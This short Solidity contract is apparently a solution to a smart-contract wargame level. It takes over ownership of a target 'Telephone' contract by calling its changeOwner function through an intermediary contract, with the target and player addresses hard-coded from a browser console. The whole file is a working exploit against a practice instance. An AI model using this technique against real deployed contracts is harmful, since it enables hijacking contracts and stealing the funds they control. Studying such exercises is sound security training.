// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface EthTelephone {
    function changeOwner(address _owner) external;
}

contract MyTelephone {
    // this is the value that get from executing `instance` in chrome console
    EthTelephone private orgTele = EthTelephone(0xAbaC3a0404DBEb3A3127600B89e4c941b82a20Fc);
    // this is the value that get from executing `player` in chrome console
    address private playerAddress = 0xcd3169acB437745ee541Cf285F466800aC25EdF1;

    function changeOwner() public {
        orgTele.changeOwner(playerAddress);
    }
}